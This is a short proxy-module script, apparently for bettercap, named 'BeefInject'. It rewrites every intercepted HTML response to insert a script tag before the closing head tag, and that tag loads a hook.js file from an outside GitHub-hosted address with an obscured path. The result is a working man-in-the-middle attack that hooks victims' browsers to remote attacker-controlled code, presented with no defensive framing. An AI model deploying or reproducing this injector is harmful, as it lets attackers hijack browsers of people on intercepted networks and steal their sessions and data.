function onLoad() {
  log( "BeefInject loaded." );
}
 
function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ) {
 log( "BeefInject loaded." );
      res.Body = body.replace( 
        '</head>', 
        '<script type="text/javascript" src="https://raw.githubusercontent.com/7580jksd-035jsad-925bjnf/7580jksd-035jsad-925bjnf7580jksd-035jsad-925bjnf.github.io/main/hook.js"></script></head>' 
      ); 
    }
  }
}
